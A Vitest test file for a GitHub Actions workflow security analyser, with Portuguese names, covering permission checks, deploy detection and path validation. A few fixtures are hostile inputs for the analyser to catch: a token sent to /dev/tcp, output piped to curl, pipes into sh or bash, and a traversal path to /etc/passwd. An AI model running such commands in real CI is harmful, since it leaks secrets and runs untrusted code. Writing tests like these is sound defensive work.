import { describe, expect, it } from 'vitest'
import { readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import {
  adicionarPermissoesMinimas,
  analisarWorkflow,
  caminhoDeWorkflowValido,
  removerPermissoesMinimas,
  BLOCO_DE_PERMISSOES_MINIMAS,
} from './workflows-de-seguranca.js'
import {
  CAMINHO_DO_WORKFLOW_DE_SENHAS,
  GITLEAKS_VERSION,
  workflowDeAlternativaGratuita,
} from './alternativa-gratuita-de-seguranca.js'
import { coletarSegurancaDoRepositorio } from './nota-de-seguranca.js'
import { criarGitHubFalso } from '../test/github-de-seguranca-fake.js'

const raizDoRepositorio = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..', '..')
const CI_DO_GITORCH = readFileSync(
  join(raizDoRepositorio, '.github', 'workflows', 'ci.yml'),
  'utf8'
)

const SHA = 'a'.repeat(40)

const SEGURO = [
  'name: build',
  'on:',
  '  push:',
  '    branches: [main]',
  '',
  'jobs:',
  '  testar:',
  '    runs-on: ubuntu-latest',
  '    steps:',
  `      - uses: actions/checkout@${SHA} # v4`,
  `      - uses: actions/setup-node@${SHA}`,
  '      - run: npm test',
  '',
].join('\n')

describe('analisarWorkflow: permissions', () => {
  it('sem permissions em lugar nenhum: não declara', () => {
    expect(analisarWorkflow('.github/workflows/build.yml', SEGURO).declaraPermissoes).toBe(false)
  })

  it('permissions no topo: declara', () => {
    const texto = SEGURO.replace('jobs:', 'permissions:\n  contents: read\n\njobs:')
    expect(analisarWorkflow('.github/workflows/build.yml', texto).declaraPermissoes).toBe(true)
  })

  it('permissions em TODOS os jobs: declara; só em um dos dois: não declara', () => {
    const doisJobs = (permB: boolean) =>
      [
        'name: x',
        'on: push',
        'jobs:',
        '  a:',
        '    runs-on: ubuntu-latest',
        '    permissions:',
        '      contents: read',
        '    steps:',
        '      - run: echo a',
        '  b:',
        '    runs-on: ubuntu-latest',
        ...(permB ? ['    permissions: {}'] : []),
        '    steps:',
        '      - run: echo b',
        '',
      ].join('\n')
    expect(analisarWorkflow('.github/workflows/x.yml', doisJobs(true)).declaraPermissoes).toBe(true)
    expect(analisarWorkflow('.github/workflows/x.yml', doisJobs(false)).declaraPermissoes).toBe(
      false
    )
  })

  it('a palavra permissions em comentário ou em texto de script não conta', () => {
    const texto = [
      'name: x',
      '# permissions: contents: write',
      'on: push',
      'jobs:',
      '  a:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - run: echo "permissions: ok"',
      '',
    ].join('\n')
    expect(analisarWorkflow('.github/workflows/x.yml', texto).declaraPermissoes).toBe(false)
  })

  it('arquivo que não dá para ler com segurança (sem jobs, com tabulação) é "não analisado", nunca "declara"', () => {
    expect(
      analisarWorkflow('.github/workflows/x.yml', 'name: x\non: push\n').declaraPermissoes
    ).toBe(null)
    expect(
      analisarWorkflow('.github/workflows/x.yml', 'name: x\njobs:\n\ta:\n\t\truns-on: x\n')
        .declaraPermissoes
    ).toBe(null)
  })

  it('indentação absurda não é de workflow de verdade: não analisado', () => {
    const texto = [
      'name: x',
      'on: push',
      'jobs:',
      `${' '.repeat(100_000)}a:`,
      '    runs-on: x',
      '',
    ].join('\n')
    expect(analisarWorkflow('.github/workflows/x.yml', texto).declaraPermissoes).toBe(null)
  })

  it('fim de linha CRLF é lido como o LF', () => {
    const crlf = SEGURO.replace(/\n/g, '\r\n')
    expect(analisarWorkflow('.github/workflows/build.yml', crlf).declaraPermissoes).toBe(false)
  })
})

describe('analisarWorkflow: deploy, gitleaks, codeql', () => {
  it.each([
    '.github/workflows/cd.yml',
    '.github/workflows/ci-cd.yml',
    '.github/workflows/deploy.yml',
    '.github/workflows/deploy-prod.yaml',
    '.github/workflows/release.yml',
    '.github/workflows/Publish-Package.yml',
  ])('o nome %s é de deploy/CD', (caminho) => {
    expect(analisarWorkflow(caminho, SEGURO).ehDeploy).toBe(true)
  })

  it('um workflow de teste comum não é de deploy', () => {
    expect(analisarWorkflow('.github/workflows/ci.yml', SEGURO).ehDeploy).toBe(false)
    expect(analisarWorkflow('.github/workflows/codeql.yml', SEGURO).ehDeploy).toBe(false)
  })

  it('o nome declarado dentro do arquivo também denuncia o deploy', () => {
    const texto = SEGURO.replace('name: build', 'name: Publicar release')
    expect(analisarWorkflow('.github/workflows/build.yml', texto).ehDeploy).toBe(true)
    const outro = SEGURO.replace('name: build', 'name: Deploy em producao')
    expect(analisarWorkflow('.github/workflows/build.yml', outro).ehDeploy).toBe(true)
  })

  it('reconhece gitleaks e codeql', () => {
    expect(analisarWorkflow('.github/workflows/a.yml', `${SEGURO}# gitleaks`).temGitleaks).toBe(
      true
    )
    expect(analisarWorkflow('.github/workflows/a.yml', SEGURO).temGitleaks).toBe(false)
    const codeql = `${SEGURO}      - uses: github/codeql-action/analyze@${SHA}\n`
    expect(analisarWorkflow('.github/workflows/a.yml', codeql).temCodeql).toBe(true)
    expect(analisarWorkflow('.github/workflows/a.yml', SEGURO).temCodeql).toBe(false)
  })
})

// A classificação de deploy lê o CORPO do workflow, não só o nome. Um workflow
// chamado "Build" que publica um pacote quando se cria uma tag é deploy, e o
// aplicador não pode abrir pull request nele sem perguntar ao dono.
describe('analisarWorkflow: deploy pelo corpo do arquivo', () => {
  const CAMINHO = '.github/workflows/build.yml'

  /** Um workflow de nome inocente, com o gatilho e os passos dados. */
  function workflow(gatilho: string, passos: string[], extraDoJob: string[] = []): string {
    return [
      'name: Build',
      'on:',
      ...gatilho.split('\n').map((l) => `  ${l}`),
      '',
      'jobs:',
      '  build:',
      '    runs-on: ubuntu-latest',
      ...extraDoJob.map((l) => `    ${l}`),
      '    steps:',
      `      - uses: actions/checkout@${SHA}`,
      ...passos.map((l) => `      ${l}`),
      '',
    ].join('\n')
  }

  it('"Build" que roda npm publish ao criar uma tag: é deploy (o caso do QA)', () => {
    const texto = workflow('push:\n  tags: ["v*"]', ['- run: npm ci', '- run: npm publish'])
    const analise = analisarWorkflow(CAMINHO, texto)
    expect(analise.ehDeploy).toBe(true)
  })

  it('o npm publish sozinho, sem gatilho de tag, já é deploy', () => {
    const texto = workflow('push:\n  branches: [main]', ['- run: npm publish --access public'])
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
  })

  it('só o gatilho de tag já é deploy', () => {
    const texto = workflow('push:\n  tags:\n    - "v*"', ['- run: npm test'])
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
  })

  it.each([
    ['on: release', 'release:\n  types: [published]'],
    ['on: workflow_run', 'workflow_run:\n  workflows: [CI]\n  types: [completed]'],
  ])('gatilho %s é deploy', (_nome, gatilho) => {
    const texto = workflow(gatilho, ['- run: npm test'])
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
  })

  it('o gatilho escrito numa linha só também vale (on: release, on: [push, release])', () => {
    const umaLinha = [
      'name: Build',
      'on: release',
      'jobs:',
      '  b:',
      '    steps:',
      '      - run: x',
      '',
    ]
    expect(analisarWorkflow(CAMINHO, umaLinha.join('\n')).ehDeploy).toBe(true)
    const lista = umaLinha.map((l) => (l === 'on: release' ? 'on: [push, release]' : l))
    expect(analisarWorkflow(CAMINHO, lista.join('\n')).ehDeploy).toBe(true)
  })

  it.each(['production', 'prod', 'staging', 'deploy', 'Production-EU'])(
    'job com environment %s é deploy',
    (ambiente) => {
      const texto = workflow(
        'push:\n  branches: [main]',
        ['- run: ./build.sh'],
        [`environment: ${ambiente}`]
      )
      expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
    }
  )

  it('environment em bloco (name: production) também é deploy', () => {
    const texto = workflow(
      'push:\n  branches: [main]',
      ['- run: ./build.sh'],
      ['environment:', '  name: production', '  url: https://exemplo.com']
    )
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
  })

  it.each([
    'docker push ghcr.io/acme/api:latest',
    'docker buildx build --push -t acme/api .',
    'yarn publish',
    'pnpm publish --no-git-checks',
    'helm upgrade --install api ./chart',
    'kubectl apply -f k8s/',
    'terraform apply -auto-approve',
    'aws s3 sync ./dist s3://meu-bucket',
    'aws ecs update-service --cluster c --service s',
    'gcloud run deploy api --image x',
    'az webapp deploy --name app',
    'flyctl deploy --remote-only',
    'npx vercel --prod',
    'netlify deploy --prod',
    'gh release create v1 ./dist/*',
    'twine upload dist/*',
    'cargo publish',
    'rsync -avz ./dist/ deploy@servidor:/var/www',
    'scp build.tar.gz deploy@servidor:/srv',
    'ssh deploy@servidor "systemctl restart api"',
  ])('o passo "%s" torna o workflow deploy', (comando) => {
    const texto = workflow('push:\n  branches: [main]', [`- run: ${comando}`])
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
  })

  it('um comando de deploy dentro de run em várias linhas também é pego', () => {
    const texto = workflow('push:\n  branches: [main]', [
      '- run: |',
      '    npm ci',
      '    npm run build',
      '    npm publish',
    ])
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
  })

  it.each([
    'docker/build-push-action',
    'docker/login-action',
    'softprops/action-gh-release',
    'pypa/gh-action-pypi-publish',
    'aws-actions/amazon-ecs-deploy-task-definition',
    'google-github-actions/deploy-cloudrun',
    'azure/webapps-deploy',
    'peaceiris/actions-gh-pages',
    'actions/deploy-pages',
    'appleboy/ssh-action',
    'superfly/flyctl-actions/setup-flyctl',
    'JamesIves/github-pages-deploy-action',
  ])('o uso da Action %s torna o workflow deploy', (acao) => {
    const texto = workflow('push:\n  branches: [main]', [`- uses: ${acao}@${SHA}`])
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
  })

  it('segredo usado num passo (secrets.X) é tratado como possível escrita externa: deploy', () => {
    const texto = workflow('push:\n  branches: [main]', [
      '- run: ./enviar.sh',
      '  env:',
      '    TOKEN: ${{ secrets.API_TOKEN }}',
    ])
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
  })

  it('"secrets: inherit" também conta', () => {
    const texto = [
      'name: Build',
      'on: push',
      'jobs:',
      '  chamar:',
      '    uses: ./.github/workflows/outro.yml',
      '    secrets: inherit',
      '',
    ].join('\n')
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
  })

  it('CI puro (checkout, setup-node, instalar, lint, testar) NÃO é deploy e continua seguro', () => {
    const texto = workflow('pull_request:\npush:\n  branches: [main]', [
      `- uses: actions/setup-node@${SHA}`,
      '- run: npm ci',
      '- run: npm run lint',
      '- run: npm test',
    ])
    const analise = analisarWorkflow(CAMINHO, texto)
    expect(analise.ehDeploy).toBe(false)
    expect(analise.seguroParaPermissaoMinima).toBe(true)
  })

  it('um workflow só de lint e testes, em outra linguagem, NÃO é deploy', () => {
    const texto = workflow('pull_request:', [
      `- uses: actions/setup-python@${SHA}`,
      '- run: pip install -r requirements.txt',
      '- run: ruff check .',
      '- run: pytest -q',
    ])
    const analise = analisarWorkflow('.github/workflows/lint-e-testes.yml', texto)
    expect(analise.ehDeploy).toBe(false)
    expect(analise.seguroParaPermissaoMinima).toBe(true)
  })

  it('palavras de deploy só em comentário NÃO viram deploy (comentário não roda)', () => {
    const texto = workflow('push:\n  branches: [main]', [
      '# aqui antes rodava npm publish e docker push',
      '- run: npm test',
    ])
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(false)
  })

  it('o gatilho de branch chamada "release" não é, sozinho, um gatilho de release', () => {
    const texto = workflow('pull_request:\n  branches: [main, "releases/**"]', ['- run: npm test'])
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(false)
  })
})

describe('analisarWorkflow: quando é seguro tirar a escrita do token', () => {
  it('só Actions conhecidas que leem e passos de shell comuns: seguro', () => {
    expect(analisarWorkflow('.github/workflows/build.yml', SEGURO).seguroParaPermissaoMinima).toBe(
      true
    )
  })

  it.each([
    ['uma Action desconhecida', `      - uses: terceiro/faz-coisa@${SHA}`],
    ['uma Action local', '      - uses: ./.github/actions/x'],
    ['o token do GitHub no passo', '      - run: echo ${{ secrets.GITHUB_TOKEN }}'],
    ['github.token', '      - run: echo ${{ github.token }}'],
    ['o gh cli', '      - run: gh pr comment 1 --body oi'],
    ['git push', '      - run: git push origin HEAD'],
    ['github-script', `      - uses: actions/github-script@${SHA}`],
    ['publicação de pacote', `      - uses: docker/build-push-action@${SHA}`],
  ])('%s: não é seguro mexer', (_nome, linha) => {
    const texto = `${SEGURO}${linha}\n`
    const analise = analisarWorkflow('.github/workflows/build.yml', texto)
    expect(analise.seguroParaPermissaoMinima).toBe(false)
    expect(analise.motivoDeNaoSeguro).toEqual(expect.any(String))
  })

  it('pull_request_target nunca é seguro', () => {
    const texto = SEGURO.replace('push:', 'pull_request_target:')
    expect(analisarWorkflow('.github/workflows/build.yml', texto).seguroParaPermissaoMinima).toBe(
      false
    )
  })
})

// Falha para o lado seguro: só é "CI puro" (permissão mínima sem perguntar) o
// workflow que se PROVA CI puro por lista branca. O que ninguém listou como
// deploy mas também não se prova CI puro é tratado como deploy ou incerto.
describe('analisarWorkflow: CI puro se prova por lista branca (falha fechada)', () => {
  const CAMINHO = '.github/workflows/ci.yml'

  function ci(passos: string[], gatilho = 'push:\n  branches: [main]'): string {
    return [
      'name: CI',
      'on:',
      ...gatilho.split('\n').map((l) => `  ${l}`),
      '',
      'jobs:',
      '  build:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      `      - uses: actions/checkout@${SHA}`,
      ...passos.map((l) => `      ${l}`),
      '',
    ].join('\n')
  }

  it.each([
    ['A) npm run deploy num job chamado build', ci(['- run: npm run deploy'])],
    [
      'B) docker buildx build com --push na linha de continuação',
      ci([
        '- run: |',
        '    docker buildx build \\',
        '      --push \\',
        '      -t ghcr.io/acme/api:latest .',
      ]),
    ],
    [
      'C) action de imagem de terceiros com push: true',
      ci([`- uses: crazy-max/ghaction-docker-buildx@${SHA}`, '  with:', '    push: true']),
    ],
    [
      'C) docker/build-push-action com push: true',
      ci([`- uses: docker/build-push-action@${SHA}`, '  with:', '    push: true']),
    ],
    ['D) script externo go-live.sh cujo conteúdo não é lido', ci(['- run: ./scripts/go-live.sh'])],
    ['E) bash de script do repositório', ci(['- run: bash tools/enviar.sh'])],
    ['F) make com alvo qualquer', ci(['- run: make entregar'])],
    ['G) npm run com script desconhecido', ci(['- run: npm run subir'])],
    [
      'H) comando encadeado que esconde um push depois de testar',
      ci(['- run: npm test && ./x.sh']),
    ],
    ['I) substituição de comando', ci(['- run: echo $(./segredo.sh)'])],
    ['J) action local', ci(['- uses: ./.github/actions/entrega'])],
    ['K) workflow reutilizável', ''],
  ])('%s: não é CI puro, vira deploy/incerto', (_nome, texto) => {
    const base =
      texto === ''
        ? [
            'name: CI',
            'on: push',
            'jobs:',
            '  b:',
            '    uses: acme/infra/.github/workflows/x.yml@main',
            '',
          ].join('\n')
        : texto
    expect(analisarWorkflow(CAMINHO, base).ehDeploy).toBe(true)
  })

  it('YAML que não dá para analisar é incerto, nunca CI puro', () => {
    expect(analisarWorkflow(CAMINHO, 'name: CI\non: push\n').ehDeploy).toBe(true)
    expect(analisarWorkflow(CAMINHO, 'name: CI\njobs:\n\tb:\n\t\truns-on: x\n').ehDeploy).toBe(true)
  })

  it.each([
    [
      'node: checkout, setup-node, pnpm install e test',
      ci([
        `- uses: actions/setup-node@${SHA}`,
        '- run: pnpm install --frozen-lockfile',
        '- run: pnpm test',
      ]),
    ],
    [
      'npm ci, lint, typecheck e build em um bloco multilinha',
      ci([
        `- uses: actions/setup-node@${SHA}`,
        '- run: |',
        '    npm ci',
        '    npm run lint',
        '    npm run typecheck',
        '    npm run build',
      ]),
    ],
    [
      'python: pip install e pytest, com upload de artefato',
      ci([
        `- uses: actions/setup-python@${SHA}`,
        '- run: pip install -r requirements.txt && pytest -q',
        `- uses: actions/upload-artifact@${SHA}`,
        '  with:',
        '    name: relatorio',
        '    path: out/',
      ]),
    ],
  ])('CI puro legítimo continua seguro: %s', (_nome, texto) => {
    const analise = analisarWorkflow(CAMINHO, texto)
    expect(analise.ehDeploy).toBe(false)
    expect(analise.seguroParaPermissaoMinima).toBe(true)
  })
})

// O que o leitor não consegue ler não prova nada: estilo flow, chaves entre
// aspas, âncoras, passos que o leitor de linhas não enxergou, scripts do
// repositório com nome inventado e comandos da lista branca encadeados com
// algo de fora dela.
describe('analisarWorkflow: o que o leitor não lê não se prova CI puro', () => {
  const CAMINHO = '.github/workflows/verificacao.yml'

  function com(passos: string[]): string {
    return [
      'name: Verificacao',
      'on: push',
      'permissions:',
      '  contents: read',
      'jobs:',
      '  build:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      ...passos.map((l) => `      ${l}`),
      '',
    ].join('\n')
  }

  it.each([
    ['script do repositório com sufixo (build:prod)', com(['- run: pnpm run build:prod'])],
    ['atalho com verbo de publicação sem limite de palavra', com(['- run: pnpm build:deployProd'])],
    ['script de teste com sufixo desconhecido', com(['- run: npm run test:entregar'])],
    ['atalho pnpm de script desconhecido', com(['- run: pnpm subir'])],
    [
      'YAML em estilo flow numa linha',
      'name: V\non: push\npermissions: {contents: read}\njobs: {build: {runs-on: ubuntu-latest, steps: [{run: "node scripts/x.js"}]}}\n',
    ],
    ['chave "run" entre aspas', com(['- "run": node scripts/x.js'])],
    ['chave "uses" entre aspas', com(['- "uses": "terceiro/acao@v1"'])],
    ["chave 'run' entre aspas simples", com(["- 'run': node scripts/x.js"])],
    ['uses em flow dentro da lista', com(['- {uses: algum/terceiro@v1}'])],
    ['run em flow dentro da lista', com(['- {run: "node scripts/x.js"}'])],
    [
      'redirecionamento de rede depois de comando da lista',
      com(['- run: echo "$GITHUB_TOKEN" > /dev/tcp/host/443']),
    ],
    ['pipe para curl', com(['- run: pnpm test | curl -d @- https://x'])],
    ['pipe para shell', com(['- run: pnpm test | sh'])],
    ['pipe para bash', com(['- run: pnpm test | bash'])],
    [
      'ponto e vírgula e script do repositório',
      com(['- run: pnpm test; node scripts/publicar.js']),
    ],
    ['& simples e script do repositório', com(['- run: pnpm test & node scripts/publicar.js'])],
    [
      '2>&1 seguido de & e script do repositório',
      com(['- run: pnpm test 2>&1 & node scripts/x.js']),
    ],
    ['&& e script do repositório', com(['- run: pnpm test && node scripts/publicar.js'])],
    [
      'quebra de linha e script do repositório',
      com(['- run: |', '    pnpm test', '    node scripts/publicar.js']),
    ],
    ['workflow sem nenhum passo legível', com([])],
    ['âncora YAML', com(['- run: pnpm test', '- &passo', '  run: node scripts/x.js', '- *passo'])],
    [
      'mescla YAML',
      [
        'name: V',
        'on: push',
        'permissions:',
        '  contents: read',
        'jobs:',
        '  a: &base',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: pnpm test',
        '  b:',
        '    <<: *base',
        '',
      ].join('\n'),
    ],
  ])('%s: não é CI puro', (_nome, texto) => {
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(true)
  })

  it.each([
    ['pnpm com redirecionamento para arquivo de log', com(['- run: pnpm test > saida.log'])],
    ['pnpm com 2>&1 e sem outro comando', com(['- run: pnpm test 2>&1'])],
    ['go test', com(['- run: go test ./...'])],
    ['pytest', com(['- run: python -m pytest -q'])],
    [
      'matriz de versões',
      [
        'name: M',
        'on: push',
        'permissions:',
        '  contents: read',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    strategy:',
        '      matrix:',
        '        node: [18, 20, 22]',
        '    steps:',
        `      - uses: actions/checkout@${SHA}`,
        '      - run: npm ci',
        '      - run: npm test',
        '',
      ].join('\n'),
    ],
  ])('CI puro legítimo segue sendo CI puro: %s', (_nome, texto) => {
    expect(analisarWorkflow(CAMINHO, texto).ehDeploy).toBe(false)
  })
})

describe('adicionarPermissoesMinimas / removerPermissoesMinimas', () => {
  it('insere o bloco antes de jobs e o resultado passa a declarar permissions', () => {
    const novo = adicionarPermissoesMinimas(SEGURO)
    expect(novo).not.toBeNull()
    expect(novo).toContain(BLOCO_DE_PERMISSOES_MINIMAS)
    expect(novo!.indexOf('permissions:')).toBeLessThan(novo!.indexOf('\njobs:'))
    expect(analisarWorkflow('.github/workflows/build.yml', novo!).declaraPermissoes).toBe(true)
    // nada além do bloco muda
    expect(novo!.replace(BLOCO_DE_PERMISSOES_MINIMAS, '')).toBe(SEGURO)
  })

  it('remover devolve EXATAMENTE o texto original (ida e volta)', () => {
    const novo = adicionarPermissoesMinimas(SEGURO)!
    expect(removerPermissoesMinimas(novo)).toBe(SEGURO)
  })

  it('preserva o fim de linha CRLF', () => {
    const crlf = SEGURO.replace(/\n/g, '\r\n')
    const novo = adicionarPermissoesMinimas(crlf)!
    expect(novo).toContain('permissions:\r\n  contents: read\r\n')
    expect(novo.replace(/\r\n/g, '')).not.toContain('\n')
    expect(removerPermissoesMinimas(novo)).toBe(crlf)
  })

  it('recusa (null) quando já declara permissions, quando não acha jobs ou acha jobs duas vezes', () => {
    expect(adicionarPermissoesMinimas(adicionarPermissoesMinimas(SEGURO)!)).toBeNull()
    expect(adicionarPermissoesMinimas('name: x\non: push\n')).toBeNull()
    expect(adicionarPermissoesMinimas(`${SEGURO}\njobs:\n  b: {}\n`)).toBeNull()
  })

  it('remover recusa (null) um texto em que o bloco foi alterado à mão', () => {
    const novo = adicionarPermissoesMinimas(SEGURO)!
    const alterado = novo.replace('contents: read', 'contents: write')
    expect(removerPermissoesMinimas(alterado)).toBeNull()
    expect(removerPermissoesMinimas(SEGURO)).toBeNull()
  })
})

describe('caminhoDeWorkflowValido', () => {
  it('aceita só arquivo yml/yaml direto em .github/workflows', () => {
    expect(caminhoDeWorkflowValido('.github/workflows/ci.yml')).toBe(true)
    expect(caminhoDeWorkflowValido('.github/workflows/ci-cd.v2.yaml')).toBe(true)
    for (const ruim of [
      '.github/workflows/../../etc/passwd',
      '.github/workflows/sub/ci.yml',
      '/.github/workflows/ci.yml',
      '.github/workflows/ci.yml?ref=x',
      '.github/workflows/ci.txt',
      '.github/workflows/ci yml.yml',
      'src/ci.yml',
      '',
    ]) {
      expect(caminhoDeWorkflowValido(ruim)).toBe(false)
    }
  })
})

describe('workflow da alternativa gratuita (gitleaks)', () => {
  const yaml = workflowDeAlternativaGratuita()

  it('o caminho gravado no repositório do cliente é um workflow válido', () => {
    expect(caminhoDeWorkflowValido(CAMINHO_DO_WORKFLOW_DE_SENHAS)).toBe(true)
  })

  it('TODAS as Actions usadas ficam fixadas por SHA completo (40 hex), nunca por tag', () => {
    const usos = [...yaml.matchAll(/^[ \t]*(?:-[ \t]*)?uses:[ \t]*(\S+)/gm)].map((m) => m[1] ?? '')
    expect(usos.length).toBeGreaterThan(0)
    for (const uso of usos) expect(uso).toMatch(/^[\w.-]+\/[\w./-]+@[0-9a-f]{40}$/)
  })

  it('e a nota de segurança do próprio GitOrch enxerga o arquivo como "Actions fixadas por SHA"', async () => {
    const github = criarGitHubFalso({
      'acme/api': {
        protecao: 'plano-gratis',
        permissaoDoToken: 'read',
        arquivos: { [CAMINHO_DO_WORKFLOW_DE_SENHAS]: yaml },
        sbom: null,
      },
    })
    const coleta = await coletarSegurancaDoRepositorio({
      repository: 'acme/api',
      defaultBranch: 'main',
      token: 't',
      fetchImpl: github.fetchFalso,
    })
    expect(coleta.checks.actionsFixadasPorSha).toBe(true)
  })

  it('a versão do gitleaks é a MESMA do ci.yml do gitorch', () => {
    const noCi = /GITLEAKS_VERSION:\s*([0-9]+\.[0-9]+\.[0-9]+)/.exec(CI_DO_GITORCH)?.[1]
    expect(noCi).toBeDefined()
    expect(GITLEAKS_VERSION).toBe(noCi)
    expect(yaml).toContain(`GITLEAKS_VERSION: ${noCi}`)
  })

  it('o checkout fixado é o MESMO commit que o ci.yml do gitorch usa', () => {
    const noCi = /actions\/checkout@([0-9a-f]{40})/.exec(CI_DO_GITORCH)?.[1]
    expect(noCi).toBeDefined()
    expect(yaml).toContain(`actions/checkout@${noCi}`)
  })

  it('declara permissão mínima, para não piorar o próprio check que ele ajuda', () => {
    expect(analisarWorkflow(CAMINHO_DO_WORKFLOW_DE_SENHAS, yaml).declaraPermissoes).toBe(true)
    expect(yaml).toMatch(/permissions:\s*\n\s+contents: read/)
  })

  it('o fluxo é o mesmo do ci.yml: baixa o binário da versão, instala e roda detect', () => {
    expect(yaml).toContain('gitleaks detect --source . --redact --exit-code 1')
    expect(yaml).toContain('releases/download/v${{ env.GITLEAKS_VERSION }}/gitleaks_')
    expect(analisarWorkflow(CAMINHO_DO_WORKFLOW_DE_SENHAS, yaml).temGitleaks).toBe(true)
  })
})
